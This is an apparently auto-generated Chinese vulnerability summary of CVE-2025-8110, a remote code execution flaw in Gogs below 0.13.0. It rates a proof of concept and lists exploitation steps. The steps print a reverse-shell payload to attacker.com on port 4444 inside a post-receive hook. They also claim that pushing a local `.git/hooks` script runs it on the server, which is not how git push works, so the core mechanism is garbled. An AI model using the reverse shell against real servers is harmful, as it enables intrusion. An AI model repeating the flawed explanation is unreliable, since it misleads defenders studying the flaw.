## CVE-2025-8110 - Gogs (自托管Git服务) 远程代码执行 (RCE), 命令注入

**漏洞编号:** CVE-2025-8110

**漏洞类型:** 远程代码执行 (RCE), 命令注入

**影响应用:** Gogs (自托管Git服务)

**危害等级:** 高危

**CVSS评分:** Unknown

**影响版本:** Gogs 版本低于 0.13.0

**利用条件:** 需要对受影响Gogs仓库具有推送 (push) 权限；需要网络访问

**POC 可用性:** 7/10

**POC 类型:** 概念验证

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2025-8110 是一个针对 Gogs 自托管 Git 服务的高危远程代码执行 (RCE) 漏洞，影响版本低于 0.13.0。该漏洞的核心是 Git Hook 机制中的命令注入缺陷，部分搜索结果也提及可能与 PutContents API 中的符号链接验证问题或任意文件写入漏洞有关，这些前置条件最终导致了命令注入并实现RCE。攻击者若对 Gogs 服务器上的某个仓库拥有推送权限，则可以精心构造一个恶意的 Git Hook 脚本（特别是 post-receive 钩子），当其推送至远程 Gogs 仓库时，该恶意脚本将在 Gogs 服务器上被执行，从而实现远程代码执行。这使得攻击者能够完全控制运行 Gogs 服务的底层系统，导致数据泄露、系统破坏或进一步的网络渗透。

**POC有效性分析：**
提供的 POC 代码包含一个 `README.md`、一个 `bash.sh` 示例和一个 `exploit.py` 脚本，有效地演示了此漏洞的利用原理和机制。`README.md` 清晰地描述了漏洞类型（Git Hook 机制中的命令注入）和受影响软件版本。`bash.sh` 提供了一个恶意 `post-receive` 钩子脚本的示例，其中包含一个反向 Shell 有效载荷（`bash -i >& /dev/tcp/attacker.com/4444 0>&1`），明确展示了 RCE 的实现方式。`exploit.py` 脚本则模拟了在本地仓库中植入恶意钩子的过程。它创建了一个名为 `/tmp/malicious_repo` 的目录结构，并在其中创建了 `.git/hooks/post-receive` 文件，写入了 `id > /tmp/gogs_exploited` 的恶意命令，并赋予其可执行权限。尽管 `exploit.py` 没有执行最终的 `git push` 操作来远程触发漏洞，但它完整地展示了如何构造并准备包含恶意钩子的本地仓库。这使得该 POC 成为一个非常清晰和实用的概念验证，对于理解漏洞的攻击面和利用步骤具有极高的参考价值。其代码结构简洁明了，易于分析和复现，有效验证了攻击者如何通过 Git Hook 机制实现命令注入和 RCE。

**利用步骤：**
1.  **前提条件：** 攻击者必须具备对目标 Gogs 服务器上某个仓库的推送 (push) 权限，且目标 Gogs 服务器版本低于 0.13.0。
2.  **本地仓库准备：** 攻击者首先在本地初始化一个 Git 仓库（或者克隆目标 Gogs 服务器上的现有仓库）。
3.  **创建恶意 Git Hook：** 在本地仓库的 `.git/hooks/` 目录下，攻击者创建一个名为 `post-receive` 的文件（或修改现有文件）。此文件将包含希望在 Gogs 服务器上执行的恶意命令。例如，可以使用 POC 中 `exploit.py` 所示的 `#!/bin/bash
bash -c "id > /tmp/gogs_exploited"`，或者 `bash.sh` 中所示的反向 Shell 命令：`#!/bin/bash
while read oldrev newrev refname; do
    bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &
done`。
4.  **赋予可执行权限：** 确保 `post-receive` 钩子脚本文件具有可执行权限，例如通过运行 `chmod +x .git/hooks/post-receive`。
5.  **触发漏洞：** 攻击者将包含恶意钩子的本地仓库内容推送 (git push) 到目标 Gogs 服务器。当 Gogs 服务器接收到推送时，`post-receive` 钩子将在服务器端自动执行。
6.  **命令执行：** 服务器执行恶意 `post-receive` 脚本中的命令，从而实现远程代码执行，例如在目标服务器上创建文件、获取系统信息、建立反向 Shell 或执行其他任意命令。

**投毒风险分析：**
该 POC 代码的投毒风险评估为低（10%）。代码内容清晰透明，不包含任何混淆、加密或异常的第三方依赖。`exploit.py` 和 `bash.sh` 中包含的有效载荷（如 `id > /tmp/gogs_exploited` 和反向 Shell `bash -i >& /dev/tcp/attacker.com/4444 0>&1`）是漏洞利用的核心组成部分，用于演示远程代码执行的能力。这些是典型的、用于证明漏洞存在和影响的攻击载荷，而非 POC 本身被恶意植入后门或额外恶意功能。POC 代码仅使用了标准的 Bash 和 Python 功能，没有进行可疑的网络请求（除了利用反向 Shell 时预期的与攻击者服务器的连接），也没有尝试下载或执行外部未知脚本。因此，在合法的防御性安全研究和测试场景下，使用此 POC 进行漏洞复现和验证是相对安全的，POC 代码本身并不会对执行环境造成额外的恶意影响。用户在使用时应注意仅在授权的测试环境中进行，以避免对生产系统造成意外损害，并确保理解其内含的攻击载荷的工作原理。

**项目地址:** N/A

**漏洞详情:** N/A
